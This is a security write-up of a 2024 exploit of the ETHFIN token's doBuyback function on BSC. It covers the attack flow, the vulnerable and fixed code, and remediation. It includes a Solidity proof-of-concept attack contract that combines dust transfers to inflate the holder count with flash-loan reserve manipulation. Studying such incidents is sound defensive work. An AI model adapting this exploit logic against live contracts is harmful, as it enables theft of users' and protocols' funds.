# ETHFIN — doBuyback Vulnerability Analysis via Holder Count Manipulation

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | ETHFIN |
| **Chain** | BSC |
| **Loss** | ~$1,240 (2.13 BNB) |
| **Attacker** | [0x52e38d49](https://bscscan.com/address/0x52e38d496f8d712394d5ed55e4d4cdd21f1957de) |
| **Attack Contract** | [0x11bfd986](https://bscscan.com/address/0x11bfd986299bb0d5666536e361f312198e882642) |
| **Vulnerable Contract** | [ETHFIN 0x17Bd2E09](https://bscscan.com/address/0x17Bd2E09fA4585c15749F40bb32a6e3dB58522bA) |
| **PancakeV3 Pool** | [0x172fcD41](https://bscscan.com/address/0x172fcD41E0913e95784454622d1c3724f546f849) |
| **Root Cause** | Artificially created holders at 501+ low-value addresses via dust transfers to satisfy the `N_holders()` condition, then executed `doBuyback()` with manipulated reserves to acquire an excessive amount of ETHFIN tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ETHFIN_exp.sol) |

---

## 1. Vulnerability Overview

ETHFIN's buyback mechanism is triggered based on the holder count returned by the `N_holders()` function. The attacker artificially inflated the holder count by sending dust amounts of ETHFIN to 501+ low-value addresses (e.g., 0x1, 0x2, ...), then called `doBuyback()` while pool reserves were manipulated via a flash loan, acquiring an excessive amount of ETHFIN at the manipulated price.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: buyback trigger based on holder count can be manipulated
function N_holders() public view returns (uint256) {
    // Simply counts addresses with balance > 0
    return holderCount;  // ← manipulable via dust transfers
}

function NextBuybackMemberCount() public view returns (uint256) {
    return lastBuybackCount + BUYBACK_INTERVAL;
}

function doBuyback() external {
    require(N_holders() >= NextBuybackMemberCount(), "not enough holders");
    // Buyback executed at reserve-based price — manipulable via flash loan
    (uint112 r0, uint112 r1,) = pair.getReserves();
    uint256 buyAmount = calculateBuyback(r0, r1);
    // ← excessive ETHFIN acquired via manipulated reserves
}

// ✅ Safe code: minimum holder balance threshold + TWAP price
uint256 public constant MIN_HOLDER_BALANCE = 1000e18;

function N_holders() public view returns (uint256) {
    // Only counts addresses holding at least the minimum balance
    return qualifiedHolderCount;  // ← not manipulable via dust transfers
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: ETHFIN_decompiled.sol
contract ETHFIN {
    function N_holders() external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Send dust ETHFIN to 501+ low-value addresses (0x1~0x1F5...)
  │         └─ Satisfies N_holders() >= NextBuybackMemberCount() condition
  │
  ├─→ [2] Execute PancakeSwap V3 flash loan
  │
  ├─→ [3] Swap WBNB → ETHFIN (reserve manipulation)
  │
  ├─→ [4] Call doBuyback()
  │         └─ Acquire excessive ETHFIN at manipulated spot price
  │
  ├─→ [5] Call skim() to extract surplus tokens
  │
  ├─→ [6] Swap ETHFIN → WBNB (reverse swap)
  │
  └─→ [7] Repay flash loan + ~2.13 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IETHFIN {
    function N_holders() external view returns (uint256);
    function NextBuybackMemberCount() external view returns (uint256);
    function doBuyback() external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPancakePool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract AttackContract {
    IETHFIN     constant ethfin = IETHFIN(0x17Bd2E09fA4585c15749F40bb32a6e3dB58522bA);
    IPancakePool constant pool  = IPancakePool(0x172fcD41E0913e95784454622d1c3724f546f849);

    function testExploit() external {
        // [1] Manipulate holder count via dust transfers to 501 low-value addresses
        uint256 nextTarget = ethfin.NextBuybackMemberCount();
        for (uint i = 1; ethfin.N_holders() < nextTarget; i++) {
            ethfin.transfer(address(uint160(i)), 1);
        }

        // [2] Manipulate reserves via flash loan
        pool.flash(address(this), 0, wbnbAmount, "");
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes calldata) external {
        // [3] Swap WBNB → ETHFIN (reserve manipulation)
        swapWBNBToETHFIN(wbnbAmount);

        // [4] Execute buyback at manipulated price
        ethfin.doBuyback();

        // [5] Swap ETHFIN → WBNB + repay flash loan
        swapETHFINToWBNB(ethfin.balanceOf(address(this)));
        WBNB.transfer(address(pool), wbnbAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Business Logic Flaw + Oracle Manipulation |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (holder count manipulation + flash loan) |
| **DApp Category** | Automated buyback token mechanism |
| **Impact** | Drain of buyback pool funds |

## 6. Remediation Recommendations

1. **Minimum holder balance threshold**: Introduce a minimum balance requirement so that dust transfers do not increment the holder count
2. **Use TWAP pricing**: Replace spot price with TWAP for price calculations inside `doBuyback()`
3. **Buyback cooldown**: Block consecutive buybacks within the same block or within a short time window
4. **Holder count snapshot**: Exclude newly added holders within a certain block range from the count

## 7. Lessons Learned

- Using a simple holder count as a buyback trigger condition makes it manipulable via dust transfers.
- Buyback price calculations based on spot reserves are vulnerable to flash loan manipulation.
- Combining two manipulable conditions (holder count + spot price) makes the attack significantly easier to execute.